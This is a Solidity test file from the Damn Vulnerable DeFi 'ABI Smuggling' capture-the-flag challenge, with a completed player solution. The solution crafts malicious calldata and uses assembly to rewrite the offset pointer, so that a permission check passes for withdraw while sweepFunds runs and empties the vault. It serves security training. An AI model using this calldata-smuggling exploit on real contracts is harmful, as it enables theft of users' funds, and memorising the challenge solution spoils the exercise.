// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console, console2} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(
            hex"85fb709d",
            deployer,
            address(vault)
        );
        bytes32 playerPermission = vault.getActionId(
            hex"d9caed12",
            player,
            address(vault)
        );
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        uint256 maliciousCalldataOffset = 0;
        bytes memory initialCalldata = abi.encode(
            vault.withdraw.selector,
            address(token),
            player,
            1
        );

        maliciousCalldataOffset = initialCalldata.length;

        console.log("Initial calldata:");
        console.logBytes(initialCalldata);

        bytes memory maliciousCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        bytes memory maliciousCalldataLenghtBytes = abi.encode(
            maliciousCalldata.length
        );

        bytes memory combinedCalldata = bytes.concat(
            initialCalldata,
            maliciousCalldataLenghtBytes,
            maliciousCalldata
        );

        //the length of address vault encoding (32) + the length of the offset pointer (32) + the length of the combined calldata length field (32)
        //malicious calldata offset adjustment that points to the start of the malicious calldata within the combined calldata
        maliciousCalldataOffset += (3 * 32);
        console.log(
            "Malicious calldata offset after adjustment:",
            maliciousCalldataOffset
        );
        bytes memory finalCalldata = abi.encodeWithSelector(
            vault.execute.selector,
            address(vault),
            combinedCalldata
        );

        //overwrite the offset pointer in the final calldata with the adjusted malicious calldata offset
        assembly {
            mstore(add(finalCalldata, 0x44), maliciousCalldataOffset)
        }

        (bool success, ) = address(vault).call(finalCalldata);

        if (!success) {
            revert("Call failed");
        }

        console.log("Vault balance:", token.balanceOf(address(vault)));
        console.log("Recovery balance:", token.balanceOf(recovery));
        vm.assertEq(token.balanceOf(address(vault)), 0);
        vm.assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
